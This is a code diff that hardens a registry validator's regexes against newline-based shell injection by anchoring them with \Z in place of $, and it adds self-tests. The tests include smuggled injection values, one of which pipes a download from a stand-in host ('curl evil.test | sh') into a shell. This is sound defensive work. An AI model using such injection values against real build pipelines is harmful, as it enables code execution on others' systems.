@@ -88,9 +88,14 @@ def asset_map(cli_binary: str, mcp_binary: str) -> dict[str, dict[str, str]]:
 # false-RED the repo on the very first entry it met - see SOURCE_DIR_RE.
 # --------------------------------------------------------------------------
 
+# Every pattern below anchors with \Z, never `$`. In Python `$` also matches
+# immediately BEFORE a trailing newline, so `re.match(r"^[a-z0-9-]*$", "hudu\n")`
+# succeeds - and a slug carrying a newline is precisely the value that turns one
+# unquoted shell interpolation into two commands. \Z is the true end of string.
+
 # A published skill slug. Lowercase alphanumerics and internal hyphens only.
 # All 67 registered slugs satisfy this today.
-SLUG_RE = re.compile(r"^[a-z0-9][a-z0-9-]*$")
+SLUG_RE = re.compile(r"^[a-z0-9][a-z0-9-]*\Z")
 
 # `source_dir` names a DIRECTORY under skills/, and it is deliberately looser
 # than SLUG_RE: msp-skills-concierge declares "_meta", whose leading underscore
@@ -99,13 +104,13 @@ SLUG_RE = re.compile(r"^[a-z0-9][a-z0-9-]*$")
 # it. What this still forbids is what actually matters here: "/" and "\" (path
 # escape), a leading "." (so "." and ".." can never match), whitespace, and
 # every shell metacharacter.
-SOURCE_DIR_RE = re.compile(r"^[a-z0-9_][a-z0-9._-]*$")
+SOURCE_DIR_RE = re.compile(r"^[a-z0-9_][a-z0-9._-]*\Z")
 
 # `cli_binary` / `mcp_binary` reach release.yml's build+upload step from the
 # same matrix JSON, so they are the same class of value as a slug. They may
 # carry a dot (a ".exe" suffix is appended downstream, and nothing forbids a
 # dotted base name), which slugs may not.
-BINARY_RE = re.compile(r"^[a-z0-9][a-z0-9._-]*$")
+BINARY_RE = re.compile(r"^[a-z0-9][a-z0-9._-]*\Z")
 
 _PATTERNS = {
     "slug": SLUG_RE,
@@ -285,6 +290,16 @@ def _self_test() -> int:
     expect_rejected("a cli_binary carrying a space",
                     {"skills": {"ok": {"cli_binary": "a b"}}}, "a b")
     expect_rejected("a non-string slug", {"skills": {"ok": {"source_dir": 7}}}, "7")
+    # The trailing-newline case: Python's `$` would accept this, and a newline
+    # inside an unquoted `${{ matrix.skill.name }}` is a second command.
+    expect_rejected("a slug with a trailing newline",
+                    {"skills": {"hudu\ncurl evil.test | sh": {}}}, "curl evil.test")
+    expect_rejected("a binary name with a trailing newline",
+                    {"skills": {"ok": {"mcp_binary": "hudu-mcp\nid"}}}, "hudu-mcp")
+    for name, pattern in _PATTERNS.items():
+        if pattern.match("safe\n"):
+            failures.append(f"{name} pattern accepts a trailing newline; anchor it with "
+                            f"\\Z, not $")
 
     if failures:
         print("FAIL: registry grammar self-test\n")
@@ -293,7 +308,8 @@ def _self_test() -> int:
         return 1
     print(f"PASS: registry grammar self-test - the live registry "
           f"({len(live['skills'])} skills) validates clean, '_meta' is accepted as a "
-          f"source_dir and rejected as a slug, and 9 malformed identifiers are refused.")
+          f"source_dir and rejected as a slug, and 11 malformed identifiers are refused "
+          f"(including the trailing-newline case Python's `$` anchor would have let through).")
     return 0
 
 
